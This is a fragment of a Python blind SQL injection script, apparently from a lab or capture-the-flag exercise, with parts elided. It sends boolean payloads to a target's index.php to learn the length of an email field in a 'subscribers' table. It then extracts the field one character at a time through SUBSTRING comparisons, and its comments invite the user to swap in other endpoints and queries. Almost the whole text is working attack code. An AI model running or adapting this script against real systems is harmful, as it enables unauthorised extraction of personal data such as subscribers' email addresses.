...
def send_payload(ip, payload):
    url = f"http://{ip}/index.php"  # -----  CHANGE ENDPOINT -----
    headers = {
...
def brute_db(ip):
    ...
    for i in range(1, 100):  # Start from 1 to avoid zero-length check
        if send_payload(ip, f"LENGTH((SELECT emails from subscribers where id=1))={i}"):  # -----  CHANGE query -----
            length = i
            break
    ...
    for i in range(1, length + 1):
        for j in range(32, 127):  # ASCII printable characters
            if send_payload(ip, f"SUBSTRING((SELECT emails from subscribers where id=1),{i},1)='{chr(j)}'"):    # -----  CHANGE query -----
                db_name += chr(j)
